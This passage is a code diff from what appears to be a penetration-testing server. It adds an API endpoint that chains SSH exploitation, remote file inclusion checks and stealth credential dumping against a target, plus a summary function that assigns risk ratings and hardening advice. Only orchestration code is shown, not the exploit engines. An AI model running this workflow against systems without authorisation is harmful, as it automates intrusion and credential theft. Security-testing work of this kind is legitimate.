+        logger.info(f"🚀 Matrix Agents: Starting multi-exploit workflow for {target}")
+
+        # Phase 1: SSH Assessment (Neo)
+        if "ssh" in workflow_type or workflow_type == "comprehensive":
+            ssh_engine = SSHExploitationEngine(intelligent_decision_engine)
+            workflow_results["phases"]["ssh_assessment"] = ssh_engine.comprehensive_ssh_assessment(target, credentials)
+
+        # Phase 2: RFI Assessment (Commander Locke) - if web target
+        if ("rfi" in workflow_type or workflow_type == "comprehensive") and target.startswith("http"):
+            rfi_exploiter = AdvancedRFIExploiter()
+            workflow_results["phases"]["rfi_assessment"] = rfi_exploiter.comprehensive_rfi_assessment(target)
+
+        # Phase 3: Credential Dumping (Trinity) - if access achieved
+        ssh_access = workflow_results.get("phases", {}).get("ssh_assessment", {}).get("phases", {}).get("exploitation", {}).get("access_achieved", False)
+        if ("credential_dump" in workflow_type or workflow_type == "comprehensive") and ssh_access and credentials:
+            workflow_results["phases"]["credential_dumping"] = cve_intelligence_manager.execute_credential_dumping_workflow(
+                target, credentials, stealth_level="medium"
+            )
+
+        # Generate integrated summary
+        workflow_results["summary"] = _generate_multi_exploit_summary(workflow_results)
+
+        logger.info(f"✅ Matrix Agents: Multi-exploit workflow completed for {target}")
+
+        return jsonify({
+            "success": True,
+            "workflow_results": workflow_results,
+            "engines_used": ["SSHExploitationEngine", "AdvancedRFIExploiter", "CVEIntelligenceManager"],
+            "agents": ["Neo", "Commander Locke", "Trinity"]
+        })
+
+    except Exception as e:
+        logger.error(f"💥 Multi-exploit workflow error: {str(e)}")
+        return jsonify({
+            "error": f"Multi-exploit workflow failed: {str(e)}"
+        }), 500
+
+def _generate_multi_exploit_summary(workflow_results):
+    """Generate summary for multi-exploitation workflow"""
+    summary = {
+        "total_phases_executed": len(workflow_results.get("phases", {})),
+        "ssh_accessible": False,
+        "rfi_vulnerable": False,
+        "credentials_extracted": 0,
+        "overall_risk": "info",
+        "exploitation_vectors": [],
+        "recommendations": []
+    }
+
+    # Analyze SSH results
+    ssh_results = workflow_results.get("phases", {}).get("ssh_assessment", {})
+    if ssh_results:
+        ssh_summary = ssh_results.get("summary", {})
+        summary["ssh_accessible"] = ssh_summary.get("ssh_accessible", False)
+        if ssh_summary.get("exploitation_success"):
+            summary["exploitation_vectors"].append("SSH Remote Access")
+
+    # Analyze RFI results
+    rfi_results = workflow_results.get("phases", {}).get("rfi_assessment", {})
+    if rfi_results:
+        rfi_summary = rfi_results.get("summary", {})
+        summary["rfi_vulnerable"] = len(rfi_summary.get("vulnerable_parameters", [])) > 0
+        if rfi_summary.get("exploitation_ready"):
+            summary["exploitation_vectors"].append("Remote File Inclusion")
+
+    # Analyze credential dumping results
+    cred_results = workflow_results.get("phases", {}).get("credential_dumping", {})
+    if cred_results:
+        cred_summary = cred_results.get("summary", {})
+        summary["credentials_extracted"] = cred_summary.get("total_credentials_found", 0)
+
+    # Determine overall risk
+    if len(summary["exploitation_vectors"]) > 1:
+        summary["overall_risk"] = "critical"
+    elif len(summary["exploitation_vectors"]) > 0:
+        summary["overall_risk"] = "high"
+    elif summary["ssh_accessible"] or summary["rfi_vulnerable"]:
+        summary["overall_risk"] = "medium"
+
+    # Generate recommendations
+    recommendations = []
+    if summary["ssh_accessible"]:
+        recommendations.extend([
+            "Harden SSH configuration",
+            "Implement key-based authentication",
+            "Monitor SSH access logs"
+        ])
+    if summary["rfi_vulnerable"]:
+        recommendations.extend([
+            "Implement input validation for file inclusion",
+            "Disable allow_url_include in PHP",
+            "Use whitelist-based file inclusion"
+        ])
+    if summary["credentials_extracted"] > 0:
+        recommendations.extend([
+            "Reset compromised credentials immediately",
+            "Implement credential rotation policies",
+            "Enhanced monitoring for credential abuse"
+        ])
+
+    summary["recommendations"] = list(set(recommendations))  # Remove duplicates
+
+    return summary
 
 # Python Environment Management Endpoints
 @app.route("/api/python/install", methods=["POST"])
